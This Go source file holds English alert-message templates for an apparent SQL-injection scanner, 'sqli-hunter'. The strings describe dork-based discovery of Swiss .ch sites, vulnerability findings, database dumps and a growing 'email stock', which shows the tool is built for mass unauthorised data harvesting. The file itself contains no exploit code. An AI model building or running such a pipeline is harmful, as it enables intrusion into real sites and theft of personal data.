package alert

import (
	"fmt"

	"github.com/sqli-hunter/sqli-hunter/internal/models"
)

var en = Texts{
	TitleDailyLaunch:   "Daily started",
	TitleWeeklyLaunch:  "Weekly started",
	TitleMonthlyLaunch: "Monthly started",
	TitleScanComplete:  "Scan complete",
	TitleDailyComplete: "Daily complete",

	Launch:       enLaunch,
	DiscoverDone: enDiscoverDone,
	ScanStarted:  enScanStarted,
	Vuln:         enVuln,
	DumpFail:     enDumpFail,
	DumpOK:       enDumpOK,
	Complete:     enComplete,
	Error:        enError,
	StockSummary: enStockSummary,
	DailyLaunch:  enDailyLaunch,
	BigLaunch:    enBigLaunch,
	DailyNoNew:   enDailyNoNew,
	DiscoverProgress: enDiscoverProgress,
	ScanProgress: enScanProgress,
}

func enLaunch(title, detail string) string {
	return "🚀 " + title + "\n" + detail
}

func enDiscoverDone(kept, skipped, fetched int) string {
	return fmt.Sprintf("🔎 Discover done\nURLs kept: %d\nskipped: %d\nfetched: %d", kept, skipped, fetched)
}

func enScanStarted(urlCount int, listFile string) string {
	return fmt.Sprintf("▶️ Scan started\nurls: %d\nfile: %s", urlCount, listFile)
}

func enVuln(f models.Finding) string {
	return "🔴 VULN " + string(f.VulnType) + "\n" + formatFinding(f)
}

func enDumpFail(f models.Finding, reason string) string {
	return "⚠️ Dump failed\n" + formatFinding(f) + "\nreason: " + reason
}

func enDumpOK(d models.ExtractedData, email string) string {
	return "✅ Dump OK\n" + formatDumpDetail(d, email)
}

func enComplete(title, detail string) string {
	return "🏁 " + title + "\n" + detail
}

func enError(msg string) string {
	return "❌ " + msg
}

func enStockSummary(baseDir string) string {
	return stockLines(baseDir, "email stock:", "• %s — %d", "email stock: empty")
}

func enDailyLaunch(limit, threads int, outputDir string) string {
	return enLaunchDetail(limit, threads, outputDir, "🇨🇭 Switzerland (.ch) · OpenSerp")
}

func enBigLaunch(limit, threads int, outputDir string) string {
	return enLaunchDetail(limit, threads, outputDir, "🇨🇭 Max emails .ch · 6525 DBMS dorks")
}

func enLaunchDetail(limit, threads int, outputDir, header string) string {
	lim := "∞"
	if limit > 0 {
		lim = fmt.Sprintf("%d", limit)
	}
	return fmt.Sprintf("%s\n📊 Limit: %s URLs\n⚡ %d threads\n📁 %s/emails/", header, lim, threads, outputDir)
}

func enDailyNoNew(baseDir string) string {
	return "Nothing new\n" + enStockSummary(baseDir)
}

func enDiscoverProgress(phase string, step, total, kept, fetched, skipped int) string {
	if phase == "fresh-pass" && total > 0 {
		return fmt.Sprintf("📊 Discover — %s\n%d/%d dorks\nURLs: %d kept · %d fetched · %d skipped",
			phase, step, total, kept, fetched, skipped)
	}
	if total > 0 {
		return fmt.Sprintf("📊 Discover — %s\npage %d/%d\nURLs: %d kept · %d fetched · %d skipped",
			phase, step, total, kept, fetched, skipped)
	}
	return fmt.Sprintf("📊 Discover — %s\npage %d\nURLs: %d kept · %d fetched · %d skipped",
		phase, step, kept, fetched, skipped)
}

func enScanProgress(scanned, total, vulns, findings int) string {
	return fmt.Sprintf("📊 Scan in progress\n%d/%d URLs · %d vulns · %d findings",
		scanned, total, vulns, findings)
}
